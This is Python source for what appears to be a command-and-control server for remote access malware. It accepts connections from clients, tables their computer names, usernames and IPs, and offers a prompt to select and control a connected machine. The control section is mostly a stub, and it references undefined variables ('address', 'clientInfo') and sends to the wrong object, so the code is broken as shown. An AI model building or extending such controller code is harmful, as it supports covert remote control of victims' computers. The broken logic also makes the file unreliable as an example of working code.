# standard libraries
import threading
import socket
import json
import os

# third-party libraries
from prettytable import PrettyTable
import webapi

# global variables
table = PrettyTable()
table.field_names = ["ID", "Computer", "IP Address", "Username"]

bufferSize = 1024
clients = []

# API functions
def OutputPipe(data):
   print(data)

# utility functions
def send(client, data):
   if (isinstance(data, bytes)):
      client.send(data)
   else:
      client.send(data.encode())

def receive(client, decode=True):
    data = client.recv(bufferSize)
    return data.decode() if decode else data

def adjustTable():
   table.clear_rows()

   for client in clients:
      table.add_row([
         clients.index(client),
         client['computer_name'],
         client['socket'].getpeername()[0],
         client['username']
      ])

# server functions
def ManageConnections(command=None):
   while (True):
      try:
         if not command:
            command = input('\n-> ').lower().strip()

         if (command == 'clients'):
            deadClients = []

            for client in clients:
              try:
                 send(client['socket'], 'ping')
                 if ('ping' in receive(client['socket'])):
                    continue
                 
              except socket.error:
                  deadClients.append(client)

            for client in deadClients:
                clients.remove(client)

            if (len(clients) < 1):
                OutputPipe('<Connections Appear Here>')
            else:
               adjustTable()
               OutputPipe(table)

         elif ('connect' in command):
            client = clients[int(command.split(' ')[1])]
            try:
               send(client['socket'], 'ping')
               if ('ping' in receive(client['socket'])):
                  ControlClient(client)

            except socket.error:
               clients.remove(client)
               OutputPipe('Unable to Connect ~ Client Removed')

      except (ValueError, IndexError):
         OutputPipe('Invalid Connection ID, try again')

      except KeyboardInterrupt:
            break

      finally:
         command = None

def ControlClient(client):
  while (True):
    try:
      command = input(f'({address[0]})> ')
      if not command:
         continue

      elif (command == '-ac'):
         OutputPipe(f'Appended Connection ~ [{clientInfo["computer_name"]}]\n')
         send(client, 'append')
         break

    except KeyboardInterrupt:
          print('\n[Keyboard Interrupted ~ Connection Appended]')
          break

    except Exception as e:
        print('Lost Connection')
        break

def RemoteConnect(server, port):
   objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   objSocket.bind((server, port))
   objSocket.listen(socket.SOMAXCONN)

   while (True):
      try:
         client, _ = objSocket.accept()
         data = json.loads(receive(client))

         clients.append({
         'socket': client,
         'computer_name': data['computer_name'],
         'username': data['username'],
         })

      except socket.error:
         objSocket.close()
         del(objSocket)
         break

webapi.api.clients = clients